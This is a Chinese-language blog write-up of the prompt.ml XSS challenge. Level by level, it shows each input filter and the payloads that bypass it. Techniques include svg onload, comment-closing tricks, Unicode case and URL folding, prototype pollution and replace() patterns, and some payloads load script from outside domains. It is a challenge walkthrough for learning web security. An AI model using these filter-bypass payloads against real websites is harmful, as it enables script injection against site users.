title: xss无声挑战赛_writeup
date: 2015-07-02 13:48:17
tags:
- Blogs
- xss
categories:
- Blogs
---

[xss挑战平台地址](http://prompt.ml/)
[源码地址](https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml)

# 规则 #
1、成功执行prompt(1).
2、payload不需要用户交互（成功会显示you won）
3、payload必须对下述浏览器有效：
Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式)
4、每个级别至少给出两种浏览器的答案
5、字符越少越好（作为一个渣渣只能把这一条扔到一边去...)

<!--more-->
# writeup #
## level 0 ##
```
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}       
```
看一看发现并没有过滤任何东西，简单粗暴的svg就好了
```
"><svg/onload="prompt(1)
```
还有一些黑科技，是从官方的writeup里看到的，ie10第一加载时会用到resize事件
```
"onresize=prompt(1)>
```
反正我电脑中的环境是执行不了的...

## level1 ##
```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}        
```
简单分析下，这条过滤比较常规，原则上就是如果>括号存在从</\开始的都替换为空，这样想
```
<script> </script>
```
都是不能用的，简单构造payload既可。
```
<svg/onload=prompt(1) 
```
这里是好像是因为会自动闭合标签，所以仍然执行
## level2 ##
```
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');
 
    // ok seriously, disallows equal signs and open parenthesis
    return input;
}
```
这里过滤了（=，只要把左括号ascii编码之后就可以了，构造payload：
```
<svg><script>prompt&#40;1)</script>
```
这里的svg不能去掉，由于xml编码特性。在SVG向量里面的script元素（或者其他CDATA元素 ），会先进行xml解析。因此&#x28（十六进制）或者&#40（十进制）或者&lpar；（html实体编码）会被还原成（。

还有一种支持es6的情况，使用eval会自动解码执行
```
<script>eval.call`${'prompt\x281)'}`</script>
```
## level3 ##
```
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');
 
    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```
源码中显示到-->被过滤，但是这题需要先闭合注释框，2012年后，html标签可以用--!>,于是构造payload：
```
--!><svg/onload=prompt(1)
```
## level4 ##
```
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}        
```
题目的意思大概是必须构造一个链接，才能使得返回答案，但是这里完全看不懂，所以贴上官方的writeup，等以后能看懂的时候回忆：
1、这个题目是利用url的特性绕过，浏览器支持这样的url：http://user:password@attacker.com。但是http://user:password/@attacker.com是不允许的。由于这里的正则特性和decodeURIComponent函数，所以可以使用%2f绕过，如下：http://prompt.ml%2f@attacker.com。所以域名越短，答案就越短。
```
//prompt.ml%2f@ᄒ.ws/✌       (这里用了@的黑魔法，后面是自己xss平台的引用，直接复制是xss)
```
2、The trick to solve the level with 17 characters only lies hidden in a transformation behavior some browsers apply when converting Unicode characters to URLs. A certain range of characters resolves to three other characters of which one is a dot - the dot we need for the URL. The following vectors uses the domain 14.rs that can be expressed by two characters only. One for the sequence 14. and one for the sequence rs:
```
//prompt.ml%2f@⒕₨
```
第二会弹出来xss...因为用了别人xss平台地址
## level5 ##
```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
} 
```
1、首先是过滤，把onxxxx=这样的替换为_,这里用一个回车绕过。
2、其次是第二点，就是后面的type不可以覆盖前面的，所以可以把type=image。
```
"type=image src onerror
="prompt(1)
```

## level6 ##
```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}        
```
分析源码可以看到，大概是由#分割，前面赋给form.action，使method=post，后面以json格式赋给formdata，把formdata中的属性循环赋给了input。后面满足forms.action存在即执行提交，所以这里使用js伪协议。
```
javascript:prompt(1)#{"action":0}
```
IE下可以使用vbscript减少字符
```
vbscript:prompt(1)#{"action":1}
```
## level7 ##
```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```
这道题目开始没有看懂，题目的原意是根据#分离，每一部分赋给一个title，如果超过12字符，则需要截取前12个，这里使用的是js注释，使代码连起来。
```
"><svg/a=#"onload='/*#*/prompt(1)'
```
这样就形成：
```
<p class="comment" title=""><svg/a="></p>
<p class="comment" title=""onload='/*"></p>
<p class="comment" title="*/prompt(1)'"></p>
```
这里不能使用/**/闭合第一行和第二行之间的东西，是因为SVG文件中可以通过任意元素的onload事件执行Javascript,且不需要用户交互。例如：
```
<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
```
这里可以看到只有让前面的svg闭合，才能在不用交互的情况下执行prompt(1)。
[原址在这里](http://html5sec.org)

还有一种ie环境下会执行的：
```
"><script x=#"async=#"src="//⒛₨
```
小技巧：IE下可以使用##async##来加载不需要闭合的script文件.如下：
```
<script src="test.js" async>
```

## level8 ##
```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}        
```
这里过滤了两个换行符，所以用到了一个特殊的编码技巧：
- <LS>是U+2028，是Unicode中的行分隔符。
- <PS>是U+2029，是Unicode中的段落分隔符。
而且-->在js中可以当注释使用，[参考资料](https://javascript.spec.whatwg.org/#comment-syntax)
于是构造答案是这样的：
```
<script>
// console.log("
prompt(1)
-->");
</script>
```
可惜我也打不过这两个符号，所以不知道是不是这样的...
```
[U+2028]prompt(1)[U+2028]-->
```

## level9 ##
```
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}        
```
简单的正则过滤，由<(开始的后面加任意字母的时候，中间都加一个_。
这里无法注入html的标签，但是toUppercase支持unicode字符，字符ſ经过函数toUpperCase()处理后，会变成ASCII码字符"S"。
```
<ſcript/ſrc=//⒕₨></ſcript>
```
或者使用async
```
<ſcript/async/src=//⒛₨>
```
官方的解释是这样的：
The special part here is the transformation behavior. Not all Unicode characters have matching representations when casted to capitals - so browsers often tend to simply take a look-alike, best-fit mapping ASCII character instead. There's a fairly large range of characters with this behavior and all browsers do it a bit differently.
## level10 ##
```
Text Viewer
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}  
```
这里会把prompt替换为alert，然后把'替换为空，但是因为替换顺序问题，所以出现了特殊的绕过方式，构造payload：
```
p'rompt(1)
```
## level11 ##
```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}     
```
这道题过滤了几乎所有的符号，只有（）可以用，这里要用个黑科技，让字母有操作符的功能，就是in.
```
"(prompt(1))in"
```
这里就会构造出
```
<script>                                    
    var data = {"action":"login","message":"Welcome back, "(prompt(1))in"."};          
    if (data.action === "login")            
        document.write(data.message)        
</script>
```
这里的原因是因为"test"(alert(1))虽然会提示语法错误， 但是还是会执行js语句。类似的alert(1)in"test"也是一样。可以在控制台下使用F12执行

## level12 ##
```
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}  
```
这道题是10的翻版，但是修复了10的漏洞，所以这里要使用eval的黑科技。
```
parseInt("prompt",36); //1558153217
```
用这个函数得到加密的代码，然后，得到payload：
```
eval((1558153217).toString(36))(1)
```
还有各种特殊的方式：
```
eval(630038579..toString(30))(1)
 
// Hexadecimal alternative (630038579 == 0x258da033):
```
甚至可以直接暴力循环着self里的函数，找到prompt：
```
for((i)in(self))eval(i)(1)
```

## level13 ##
```
function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}        
```
这题的源码实在过于复杂，于是这里贴上官方的解释和payload：
这个题目涉及到js中的__proto__，每个对象都会在其内部初始化一个属性，就是__proto__，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去__proto__里面找这个属性，这个__proto__又会有自己的__proto__，一直这样找下去。可以再Chrome控制台中测试：
```
config = {
    "source": "_-_invalid-URL_-_",
    "__proto__": {
        "source": "my_evil_payload"
    }
}
```
输入
```
delete config.source
config.source
```
返回my_evil_payload

还有一个技巧是，replace()这个函数，他还接受一些特殊的匹配模式。
**$` 替换查找的字符串，并且在头部加上比配位置前的字符串部分**
例如：
```
'123456'.replace('34','$`xss')
```
返回：
```
'1212xss56'
```
这样一来构造出payload:
```
{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
```
## level14 ##
```
Text Viewer
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
} 
```
1、首先所有的都是用大写字母。
2、然后你无法执行任何url，都会被转化为data：
3、最后包括\&都被过滤，所以你不能使用十六进制或者10进制编码。

这里想到的是用base64绕过，但是由于必须是大写字母的关系，所以我们必须用特殊的手段，官方解释是这样的：
One solution working in Firefox is to use the data scheme and hide the payload in base64. This will work because Firefox accepts "BASE64" as an encoding definition (compared to other browsers that require "base64" in lower case).

The remaining challenge is to craft a payload that will be represented upper case chars of base64. This can be achieved by using an upper case payload. for example, the following 

payload:
```
"><IFRAME/SRC="x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=
```
虽然base64帮助我们绕过很多，但是这里真正的黑魔法是msie，官方给出的是这样的：

While the Base64-based bypass was essentially a lot of engineering work, the true magic is in the MSIE version of this vector. Note that we bypass the check for // by using a Unicode representation of the slash. This and other Unicode characters work for that purpose. It has to be the second character only though. The first must be an actial slash (or solidus).
可惜可能是浏览器问题，我仍然执行不了。

## level15 ##
```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}        
```
这里和前面的7题类似，但是以15字母为一部分划分，而且js注释被过滤，不能使用/*，但是我们仍然可以使用html的注释绕过字符限制。
```
"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>
```
这样一来源码会变成：
```
<p class="comment" title=""><svg><!--" data-comment='{"id":0}'></p>
<p class="comment" title="--><script><!--" data-comment='{"id":1}'></p>
<p class="comment" title="-->prompt(1<!--" data-comment='{"id":2}'></p>
<p class="comment" title="-->)</script>" data-comment='{"id":3}'></p>
```

## level-1 ##
```
function escape(input) {
    // WORLD -1

    // strip off certain characters from breaking conditional statement
    input = input.replace(/[}<]/g, '');

    return '                                                     \n\
<script>                                                         \n\
    if (history.length > 1337) {                                 \n\
        // you can inject any code here                          \n\
        // as long as it will be executed                        \n\
        {{injection}}                                            \n\
    }                                                            \n\
</script>                                                        \n\
    '.replace('{{injection}}', input);
}        
```
这里可以看到过滤了一部分符号，而且判断长度必须大于1337，所以用到js变量提升，还用到了一个前面提到的关于replace的匹配技巧。
playload：
```
function history(L,o,r,e,m,I,p,s,u,m,i,s,s,i,m,p,l,y,d,u,m,m,y,t,e,x,t,o,f,t,h,e,p,r,i,n,t,i,n,g,a,n,d,t,y,p,e,s,e,t,t,i,n,g,i,n,d,u,s,t,r,y,L,o,r,e,m,I,p,s,u,m,h,a,s,b,e,e,n,t,h,e,i,n,d,u,s,t,r,y,s,s,t,a,n,d,a,r,d,d,u,m,m,y,t,e,x,t,e,v,e,r,s,i,n,c,e,t,h,e,s,w,h,e,n,a,n,u,n,k,n,o,w,n,p,r,i,n,t,e,r,t,o,o,k,a,g,a,l,l,e,y,o,f,t,y,p,e,a,n,d,s,c,r,a,m,b,l,e,d,i,t,t,o,m,a,k,e,a,t,y,p,e,s,p,e,c,i,m,e,n,b,o,o,k,I,t,h,a,s,s,u,r,v,i,v,e,d,n,o,t,o,n,l,y,f,i,v,e,c,e,n,t,u,r,i,e,s,b,u,t,a,l,s,o,t,h,e,l,e,a,p,i,n,t,o,e,l,e,c,t,r,o,n,i,c,t,y,p,e,s,e,t,t,i,n,g,r,e,m,a,i,n,i,n,g,e,s,s,e,n,t,i,a,l,l,y,u,n,c,h,a,n,g,e,d,I,t,w,a,s,p,o,p,u,l,a,r,i,s,e,d,i,n,t,h,e,s,w,i,t,h,t,h,e,r,e,l,e,a,s,e,o,f,L,e,t,r,a,s,e,t,s,h,e,e,t,s,c,o,n,t,a,i,n,i,n,g,L,o,r,e,m,I,p,s,u,m,p,a,s,s,a,g,e,s,a,n,d,m,o,r,e,r,e,c,e,n,t,l,y,w,i,t,h,d,e,s,k,t,o,p,p,u,b,l,i,s,h,i,n,g,s,o,f,t,w,a,r,e,l,i,k,e,A,l,d,u,s,P,a,g,e,M,a,k,e,r,i,n,c,l,u,d,i,n,g,v,e,r,s,i,o,n,s,o,f,L,o,r,e,m,I,p,s,u,m,I,t,i,s,a,l,o,n,g,e,s,t,a,b,l,i,s,h,e,d,f,a,c,t,t,h,a,t,a,r,e,a,d,e,r,w,i,l,l,b,e,d,i,s,t,r,a,c,t,e,d,b,y,t,h,e,r,e,a,d,a,b,l,e,c,o,n,t,e,n,t,o,f,a,p,a,g,e,w,h,e,n,l,o,o,k,i,n,g,a,t,i,t,s,l,a,y,o,u,t,T,h,e,p,o,i,n,t,o,f,u,s,i,n,g,L,o,r,e,m,I,p,s,u,m,i,s,t,h,a,t,i,t,h,a,s,a,m,o,r,e,o,r,l,e,s,s,n,o,r,m,a,l,d,i,s,t,r,i,b,u,t,i,o,n,o,f,l,e,t,t,e,r,s,a,s,o,p,p,o,s,e,d,t,o,u,s,i,n,g,C,o,n,t,e,n,t,h,e,r,e,c,o,n,t,e,n,t,h,e,r,e,m,a,k,i,n,g,i,t,l,o,o,k,l,i,k,e,r,e,a,d,a,b,l,e,E,n,g,l,i,s,h,M,a,n,y,d,e,s,k,t,o,p,p,u,b,l,i,s,h,i,n,g,p,a,c,k,a,g,e,s,a,n,d,w,e,b,p,a,g,e,e,d,i,t,o,r,s,n,o,w,u,s,e,L,o,r,e,m,I,p,s,u,m,a,s,t,h,e,i,r,d,e,f,a,u,l,t,m,o,d,e,l,t,e,x,t,a,n,d,a,s,e,a,r,c,h,f,o,r,l,o,r,e,m,i,p,s,u,m,w,i,l,l,u,n,c,o,v,e,r,m,a,n,y,w,e,b,s,i,t,e,s,s,t,i,l,l,i,n,t,h,e,i,r,i,n,f,a,n,c,y,V,a,r,i,o,u,s,v,e,r,s,i,o,n,s,h,a,v,e,e,v,o,l,v,e,d,o,v,e,r,t,h,e,y,e,a,r,s,s,o,m,e,t,i,m,e,s,b,y,a,c,c,i,d,e,n,t,s,o,m,e,t,i,m,e,s,o,n,p,u,r,p,o,s,e,i,n,j,e,c,t,e,d,h,u,m,o,u,r,a,n,d,t,h,e,l,i,k,e,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_,_)$&prompt(1)
```
这里用到的是一个特殊的技巧，测试下面的代码：
```
function functionDeclaration(a,b,c) {
    alert('Function declared with ' + functionDeclaration.length + ' parameters');
}
 
 
functionDeclaration(); 
```
返回：
```
alert > Function declared with 3 parameters
```
所以构造这样的代码：
```
if (history.length > 1337) {                                 
   // you can inject any code here
   // as long as it will be executed
   function history(l,o,r,e,m...1338 times...){{injection}}
   prompt(1)
}   
```


